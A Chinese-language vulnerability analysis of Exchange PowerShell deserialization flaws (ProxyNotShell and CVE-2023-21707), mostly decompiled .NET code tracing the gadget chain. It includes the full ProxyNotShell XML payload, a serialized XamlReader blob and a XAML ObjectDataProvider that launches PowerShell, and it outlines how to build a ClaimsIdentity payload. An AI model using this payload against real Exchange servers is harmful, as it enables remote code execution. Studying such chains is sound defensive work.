## 漏洞原理

### 流程梳理

先分析一下与 powershell 接口交互的 xml 数据的处理流程。xml 信息传入后，会被 `PSSerializer.Deserialize`
反序列化后作为 `PSObject` 类。

    
    
    // System.Management.Automation.PSObject
    private object lockObject = new object();
    protected PSObject(SerializationInfo info, StreamingContext context)
    {
        if (info == null)
        {
            throw PSTraceSource.NewArgumentNullException("info");
        }
        string text = info.GetValue("CliXml", typeof(string)) as string;
        if (text == null)
        {
            throw PSTraceSource.NewArgumentNullException("info");
        }
        PSObject psobject = PSObject.AsPSObject(PSSerializer.Deserialize(text));
        this.CommonInitialization(psobject.ImmediateBaseObject);
        PSObject.CopyDeserializerFields(psobject, this);
    }
    

其调用链如下

![](./img/9025885948401887842.png)

而当 `targetTypeForDeserialization` 不为空时，`ReadOneObject` 会继续调用
`LanguagePrimitives.ConvertTo` 将 obj 转换为指定的类型。

    
    
    internal object ReadOneObject(out string streamName)
    {
        //...
                    if (null != targetTypeForDeserialization)
                    {
                        Exception ex = null;
                        try
                        {
                            object obj2 = LanguagePrimitives.ConvertTo(obj, targetTypeForDeserialization, true, CultureInfo.InvariantCulture, this._typeTable);
                            PSEtwLog.LogAnalyticVerbose(PSEventId.Serializer_RehydrationSuccess, PSOpcode.Rehydration, PSTask.Serialization, PSKeyword.Serializer, new object[]
                            {
                                psobject.InternalTypeNames.Key,
                                targetTypeForDeserialization.FullName,
                                obj2.GetType().FullName
                            });
                            return obj2;
                        }
        //...
    }
    

`targetTypeForDeserialization` 通过 `GetTargetTypeForDeserialization` 获取，而
`GetTargetTypeForDeserialization` 又调用了 `GetPSStandardMember`。首先调用
`TypeTableGetMemberDelegate` 根据 this 的类型和 `typeTable` 即 `types.ps1xml` 找到
`PSStandardMembser`。

    
    
    internal Type GetTargetTypeForDeserialization(TypeTable backupTypeTable)
    {
        PSMemberInfo psstandardMember = this.GetPSStandardMember(backupTypeTable, "TargetTypeForDeserialization");
        if (psstandardMember != null)
        {
            return psstandardMember.Value as Type;
        }
        return null;
    }
    
    internal PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, string memberName)
    {
        PSMemberInfo psmemberInfo = null;
        TypeTable typeTable = (backupTypeTable != null) ? backupTypeTable : this.GetTypeTable();
        if (typeTable != null)
        {
            PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate<PSMemberSet>(this, typeTable, "PSStandardMembers");
            if (psmemberSet != null)
            {
                psmemberSet.ReplicateInstance(this);
                psmemberInfo = new PSMemberInfoIntegratingCollection<PSMemberInfo>(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName];
            }
        }
        if (psmemberInfo == null)
        {
            psmemberInfo = (this.InstanceMembers["PSStandardMembers"] as PSMemberSet);
        }
        return psmemberInfo;
    }
    

而后调用 `GetMemberCollection`，一个从 PowerShell 的内部实现中获取 PSMemberInfo 对象集合的方法。它根据给定的
`viewType` 和从 `backupTypeTable` 获取对应的 `PSMemberInfo` 集合。

PSMemberViewTypes 是一个枚举，用来指示获取哪种类型的成员信息。它可以是以下几种：

  * Extended：获取扩展成员，即那些由类型数据表定义的成员。
  * Adapted：获取适配成员，即那些由 PowerShell 适配器添加的成员。
  * Base：获取基础成员，即那些直接从.NET 对象继承的成员。

而调用时使用的是 `PSMemberViewTypes.All`，这就导致可以通过 extended 或 adapted 属性自定义一个 Type，让
`GetTargetTypeForDeserialization` 返回自定义的类型，进行反序列化。

    
    
    internal static Collection<CollectionEntry<PSMemberInfo>> GetMemberCollection(PSMemberViewTypes viewType, TypeTable backupTypeTable)
    {
        Collection<CollectionEntry<PSMemberInfo>> collection = new Collection<CollectionEntry<PSMemberInfo>>();
        if ((viewType & PSMemberViewTypes.Extended) == PSMemberViewTypes.Extended)
        {
            if (backupTypeTable == null)
            {
                collection.Add(new CollectionEntry<PSMemberInfo>(new CollectionEntry<PSMemberInfo>.GetMembersDelegate(PSObject.TypeTableGetMembersDelegate<PSMemberInfo>), new CollectionEntry<PSMemberInfo>.GetMemberDelegate(PSObject.TypeTableGetMemberDelegate<PSMemberInfo>), true, true, "type table members"));
            }
            else
            {
                collection.Add(new CollectionEntry<PSMemberInfo>((PSObject msjObj) => PSObject.TypeTableGetMembersDelegate<PSMemberInfo>(msjObj, backupTypeTable), (PSObject msjObj, string name) => PSObject.TypeTableGetMemberDelegate<PSMemberInfo>(msjObj, backupTypeTable, name), true, true, "type table members"));
            }
        }
        if ((viewType & PSMemberViewTypes.Adapted) == PSMemberViewTypes.Adapted)
        {
            collection.Add(new CollectionEntry<PSMemberInfo>(new CollectionEntry<PSMemberInfo>.GetMembersDelegate(PSObject.AdapterGetMembersDelegate<PSMemberInfo>), new CollectionEntry<PSMemberInfo>.GetMemberDelegate(PSObject.AdapterGetMemberDelegate<PSMemberInfo>), false, false, "adapted members"));
        }
        if ((viewType & PSMemberViewTypes.Base) == PSMemberViewTypes.Base)
        {
            collection.Add(new CollectionEntry<PSMemberInfo>(new CollectionEntry<PSMemberInfo>.GetMembersDelegate(PSObject.DotNetGetMembersDelegate<PSMemberInfo>), new CollectionEntry<PSMemberInfo>.GetMemberDelegate(PSObject.DotNetGetMemberDelegate<PSMemberInfo>), false, false, "clr members"));
        }
        return collection;
    }
    

### ConvertTo gadget 分析

根据 <https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf> 中关于 `LanguagePrimitives.ConvertTo` 的分析，可知其有几种可能的利用：

  1. 调用任意包含一个可指定参数的 public 类的 constructor

调用如下

![](./img/794901216556390987.png)

`fromType` 与 `toType` 即原 obj 类型与 `targetTypeForDeserialization` 指定 type

![](./img/4192001897277848271.png)

  1. 调用可控类的静态 public Parse(string) 方法

调用如下

![](./img/6073746226164874642.png)

如下调用了 toType 的 Parse 方法

![](./img/8857663056428341850.png)

  1. 执行自定义的 Convert

通过 `LanguagePrimitives.FigureConversion` 获取对应的 `ConverterData`，其中包含对应的
`Converter`，并通过其执行进一步的 `Convert` 操作

![](./img/8670472618746837841.png)

![](./img/6786352549803194932.png)

### Proxynotshell payload 分析

首先是 proxynotshell 的反序列化部分，情报中公布的 poc 直接修改了 python 的 pypsrp 包进行交互，xml
中还包括了很多其他所需内容。忽略其他信息，关键的类如下。即这个命令的 `-Identity:` 参数是一个
`Microsoft.PowerShell.Commands.Internal.Format.FormatInfoData` 类，包含两个属性，其中一个
Type 属性是 `TargetTypeForDeserialization` 对象。

    
    
    <Obj N="Args" RefId="12">
      <TNRef RefId="0"/>
      <LST>
        <Obj RefId="13">
          <MS>
            <S N="N">-Identity:</S>
            <Obj N="V" RefId="14">
              <TN RefId="2">
                <T>Microsoft.PowerShell.Commands.Internal.Format.FormatInfoData</T>
                <T>System.Object</T>
              </TN>
              <ToString>Object</ToString>
              <Props>
                <S N="Name">Type</S>
                <Obj N="TargetTypeForDeserialization">
                  <TN RefId="2">
                    <T>System.Exception</T>
                    <T>System.Object</T>
                  </TN>
                  <MS>
                    <BA N="SerializationData">AAEAAAD /////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=</BA>
                  </MS>
                </Obj>
              </Props>
              <S>
                  <![CDATA[<ObjectDataProvider MethodName="Start" IsInitialLoadEnabled="False" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:sd="clr-namespace:System.Diagnostics;assembly=System" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"> <ObjectDataProvider.ObjectInstance> <sd:Process> <sd:Process.StartInfo> <sd:ProcessStartInfo Arguments="-e $$POWERSHELL_ENCODE_PAYLOAD_HERE$$" StandardErrorEncoding="{x:Null}" StandardOutputEncoding="{x:Null}" UserName="" Password="{x:Null}" Domain="" LoadUserProfile="False" FileName="powershell" /> </sd:Process.StartInfo> </sd:Process> </ObjectDataProvider.ObjectInstance> </ObjectDataProvider>]]>
              <S/>
            </Obj>
          </MS>
        </Obj>
      </LST>
    </Obj>
    

递归进行反序列化时，`TargetTypeForDeserialization` 首当其冲。`TargetTypeForDeserialization`
指定的类型是 `System.Exception`，这里就是上文中的第三种利用。在 `exchange.partial.types.ps1xml`
中可以找到其指定的 `Converter`。

![](./img/7642518314085905057.png)

找到 `Microsoft.Exchange.Data.SerializationTypeConverter`，其 convert 操作都调用了
`DeserializeObject`

![](./img/3468617023577597038.png)

    
    
    private object DeserializeObject(object sourceValue, Type destinationType)
    {
        Exception ex = null;
        byte[] array;
        string text;
        if (!this.CanConvert(sourceValue, destinationType, out array, out text, out ex))
        {
            throw ex;
        }
        // ...
        try
        {
            using (MemoryStream memoryStream = new MemoryStream(array))
            {
                AppDomain.CurrentDomain.AssemblyResolve += SerializationTypeConverter.AssemblyHandler;
                try
                {
                    int tickCount = Environment.TickCount;
                    obj = this.Deserialize(memoryStream);
                    // ...
                }
                // ...
    }
    

`DeserializeObject` 首先调用了 `CanConvert`，将 `SerializationData` 的值放到
`serializationData` 也就是 `array` 中，而后又赋值给 `memoryStream` 进行进一步反序列化

    
    
    private bool CanConvert(object sourceValue, Type destinationType, out byte[] serializationData, out string stringValue, out Exception error)
    {
        // ...
        object value = psobject.Properties["SerializationData"].Value;
        if (!(value is byte[]))
        {
            error = new NotSupportedException(DataStrings.ExceptionUnsupportedDataFormat(value));
            return false;
        }
        stringValue = psobject.ToString();
        serializationData = (value as byte[]);
        return true;
    }
    

`Deserialize` 中生成 `BinaryFormatter` 对数据进行进一步反序列化，而此处 `allowedTypes`
即为白名单，其中就包含有 `System.UnitySerializationHolder`

    
    
    internal object Deserialize(MemoryStream stream)
    {
        bool strictModeStatus = Serialization.GetStrictModeStatus(DeserializeLocation.SerializationTypeConverter);
        return ExchangeBinaryFormatterFactory.CreateBinaryFormatter(DeserializeLocation.SerializationTypeConverter, strictModeStatus, SerializationTypeConverter.allowedTypes, SerializationTypeConverter.allowedGenerics).Deserialize(stream);
    }
    

![](./img/3137533075124949193.png)

简单查看序列化的内容 base64 解码即可看出，借用 `System.UnitySerializationHolder` 反序列化后
`FormatInfoData` 的 Type 是一个 `System.Windows.Markup.XamlReader` 实例

![](./img/5671115953688415391.png)

而接下来进行进一步反序列化，但由于 `types.ps1xml` 中并没有指定 `FormatInfoData`
的相关信息，而根据[流程梳理](https://datangqian.feishu.cn/docx/RrEPdkmiuobqpfxQ5Eyc9lg7nAc#FSQ8dTmP6oxgbUxAGLncJoYjn0b)最后部分的叙述可知，此时的
`targetTypeForDeserialization` 就是其 Type 属性，也就是那个
`System.Windows.Markup.XamlReader` 实例。而此时再利用 gadget 的第二条，调用其 `Parse` 方法，解析
xaml 语句即可实现利用启动 powershell 进行 rce

修复：引入了一个 `UnitySerializationHolderSurrogateSelector`，会在
`System.UnitySerializationHolder` 反序列化过程中验证目标的类型。因此，`Parse(string)`
不再可能利用此漏洞进行调用。

### CVE-2023-21707 分析

类似于 Proxynotshell 的利用流程，直到调用了 `BinaryFormatter` 的反序列化。

在 `BinaryFormatter`
反序列化的白名单中，又找到了一个特殊的类：`Microsoft.Exchange.Security.Authentication.GenericSidIdentity`，这个类也在白名单中。

![](./img/8163176590205572522.png)

且这个类继承了 `ClaimsIdentity` 这个著名的.Net 反序列化 gadget 类。

![](./img/841812540749504263.png)

`ClaimsIdentity` 的 `OnDeserializedMethod` 中对 `m_serializedClaims` 进行了二次反序列化

    
    
    // System.Security.Claims.ClaimsIdentity
    [OnDeserialized]
    [SecurityCritical]
    private void OnDeserializedMethod(StreamingContext context)
    {
        if (this is ISerializable)
        {
            return;
        }
        if (!string.IsNullOrEmpty(this.m_serializedClaims))
        {
            this.DeserializeClaims(this.m_serializedClaims);
            this.m_serializedClaims = null;
        }
        this.m_nameType = (string.IsNullOrEmpty(this.m_serializedNameType) ? "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name" : this.m_serializedNameType);
        this.m_roleType = (string.IsNullOrEmpty(this.m_serializedRoleType) ? "http://schemas.microsoft.com/ws/2008/06/identity/claims/role" : this.m_serializedRoleType);
    }
    

`DeserializeClaims` 将数据 base64 解码后同样也使用了 `BinaryFormatter` 进行进一步反序列化。

    
    
    // System.Security.Claims.ClaimsIdentity
    [SecurityCritical]
    private void DeserializeClaims(string serializedClaims)
    {
        if (!string.IsNullOrEmpty(serializedClaims))
        {
            using (MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(serializedClaims)))
            {
                this.m_instanceClaims = (List<Claim>)new BinaryFormatter().Deserialize(memoryStream, null, false);
                for (int i = 0; i < this.m_instanceClaims.Count; i++)
                {
                    this.m_instanceClaims[i].Subject = this;
                }
            }
        }
        if (this.m_instanceClaims == null)
        {
            this.m_instanceClaims = new List<Claim>();
        }
    }
    

故首先利用 yso 生成 `ClaimsIdentity` 的 `BinaryFormatter` 的反序列化 payload，再将 payload 的
b64 编码数据通过反射放入 `ClaimsIdentity` 的 `m_serializedClaims` 中。也就是
`Microsoft.Exchange.Security.Authentication.GenericSidIdentity` 的
`m_serializedClaims` 中，再将这个类通过 `BinaryFormatter`
进行序列化，将序列化结果写入exception的SerializationData，就得到了可用的 payload。这里就不贴代码了。

参考连接：  
<https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf>  
<https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend>

